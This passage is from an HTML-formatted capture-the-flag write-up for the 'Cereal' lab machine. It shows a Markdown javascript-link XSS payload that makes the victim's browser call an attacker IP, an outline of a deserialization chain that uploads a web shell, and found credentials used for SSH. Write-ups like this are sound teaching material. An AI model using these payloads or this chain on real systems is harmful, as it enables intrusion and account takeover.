-<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Accordion</span>.<span style="color:#a6e22e">Toggle</span> <span style="color:#a6e22e">as</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">Button</span>} <span style="color:#a6e22e">variant</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;link&#34;</span> <span style="color:#a6e22e">eventKey</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>} <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;expand&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span>{<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">requestId</span>}<span style="color:#f92672">&gt;</span>
-    {<span style="color:#a6e22e">requestData</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">&amp;&amp;</span> 
-        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">MarkdownPreview</span> <span style="color:#a6e22e">markedOptions</span><span style="color:#f92672">=</span>{{ <span style="color:#a6e22e">sanitize</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }} <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span>} <span style="color:#f92672">/&gt;</span> <span style="color:#75715e">// &lt;==
-</span><span style="color:#75715e"></span>...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
-</code></pre></div><p>I could confirm the vulnerability with the following payload:</p>
-<pre><code>[XSS](javascript: document.write`&lt;img src='http://10.10.14.3/iamf'/&gt;`)
-</code></pre><p><img class="img-container" src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  />
-</p>
-<p>With a few experiments, URL encoding seems to work as well</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">[<span style="color:#f92672">XSS</span>](<span style="color:#a6e22e">javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
-</code></pre></div><h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-sonny">Shell as Sonny</h3>
-<h4 id="web-shell-upload-via-xss-and-deserialization">Web Shell Upload via XSS and Deserialization</h4>
-<p>Putting it all together:</p>
-<ul>
-<li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code>.</li>
-<li>The gadget classes for deserialization attack are filtered, but there is one class called <code>DownloadHelper</code> that can be accessed and it has a download function.</li>
-<li>There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li>
-</ul>
-<p>The tactics:</p>
-<ul>
-<li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=25">Serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID.</li>
-<li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
-<li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
-</ul>
-<p>I already made a <a href="https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1">script</a> to chain those vulnerabilities:</p>
-<p><img class="img-container" src="imgs/image-20210609125605658.png" alt="image-20210609125605658"  />
-</p>
-<blockquote>
-<p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p>
-</blockquote>
-<p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code></p>
-<p><img class="img-container" src="imgs/image-20210609125710180.png" alt="image-20210609125710180"  />
-</p>
-<h3 id="ssh---sonny">SSH - sonny</h3>
-<p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p>
-<p><img class="img-container" src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  />
-</p>
-<p>I tried it on SSH (<code>sonny:mutual.madden.manner38974</code>) and it worked.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.2» 
-$ ssh sonny@cereal.htb
-sonny@cereal.htb&#39;s password: 
-Microsoft Windows [Version 10.0.17763.1817]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-sonny@CEREAL C:\Users\sonny&gt;dir desktop\ 
- Volume in drive C has no label.                   
- Volume Serial Number is C4EF-2153                 
-                                                   
- Directory of C:\Users\sonny\desktop               
-                                                   
-11/16/2020  05:19 AM    &lt;DIR&gt;          .           
-11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
-06/07/2021  09:59 PM                34 user.txt    
-               1 File(s)             34 bytes      
-               2 Dir(s)   7,621,619,712 bytes free 
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>It&rsquo;s retired already.</p>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
-<li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
-<li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
 </ul>
 ]]></content:encoded>
     </item>
